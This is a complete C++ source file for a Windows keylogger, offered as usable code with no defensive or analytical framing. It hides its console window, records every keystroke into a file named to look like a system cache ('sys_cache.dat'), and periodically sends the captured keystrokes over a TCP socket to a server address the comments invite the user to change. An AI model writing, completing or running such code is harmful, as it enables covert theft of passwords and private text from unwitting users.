#include <iostream>
#include <fstream>
#include <windows.h>
#include <winsock2.h>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")

void hideConsole()
{
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL)
        ShowWindow(hWnd, SW_HIDE);
}

std::string getCurrentTime()
{
    SYSTEMTIME time;
    GetLocalTime(&time);

    char buffer[20];
    sprintf(buffer, "[%02d:%02d:%02d]", time.wHour, time.wMinute, time.wSecond);
    return std::string(buffer);
}

void sendLogs(const std::string &logContent)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(8080);                   // Change if needed
    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Change if needed

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == 0)
    {
        send(s, logContent.c_str(), logContent.length(), 0);
    }

    closesocket(s);
    WSACleanup();
}

void logKeys()
{
    static std::ofstream logFile("sys_cache.dat", std::ios::app);
    static bool keyStates[256] = {false}; // Track key states to prevent duplicate logging
    static bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001);
    static std::string logBuffer;
    static bool firstLog = true;

    // Log start time once
    if (firstLog)
    {
        logFile << "Log started at: " << getCurrentTime() << std::endl;
        logFile.flush();
        firstLog = false;
    }

    for (unsigned char key = 8; key < 255; key++)
    {
        SHORT keyState = GetAsyncKeyState(key);
        bool isPressed = (keyState & 0x8000) != 0;

        if (isPressed && !keyStates[key]) // Only log new keypresses
        {
            keyStates[key] = true;

            std::string logEntry;

            // Detect CAPS LOCK changes
            bool newCapsLockState = (GetKeyState(VK_CAPITAL) & 0x0001);
            if (newCapsLockState != capsLockOn)
            {
                capsLockOn = newCapsLockState;
                logEntry += capsLockOn ? "CAPSLOCKON " : "CAPSLOCKOFF ";
            }

            // Convert key to readable format
            switch (key)
            {
            case VK_RETURN:
                logEntry += "ENTER";
                break;
            case VK_SPACE:
                logEntry += " ";
                break;
            case VK_BACK:
                logEntry += "BACKSPACE";
                break;
            case VK_TAB:
                logEntry += "TAB";
                break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                logEntry += "SHIFT";
                break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                logEntry += "CTRL";
                break;
            case VK_MENU:
            case VK_LMENU:
            case VK_RMENU:
                logEntry += "ALT";
                break;
            case VK_ESCAPE:
                logEntry += "ESC";
                break;
            case VK_F2:
                logEntry += "F2";
                break;
            default:
                if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9'))
                {
                    logEntry += static_cast<char>(key);
                }
            }

            // Write to file & buffer
            if (!logEntry.empty())
            {
                logFile << logEntry << std::endl;
                logFile.flush();
                logBuffer += logEntry + "\n";
            }

            // Send logs periodically
            if (logBuffer.length() > 100)
            {
                sendLogs(logBuffer);
                logBuffer.clear();
            }
        }
        else if (!isPressed)
        {
            keyStates[key] = false; // Reset key state when released
        }
    }
}

int main()
{
    hideConsole();

    while (true)
    {
        logKeys();
        Sleep(10);
    }

    return 0;
}

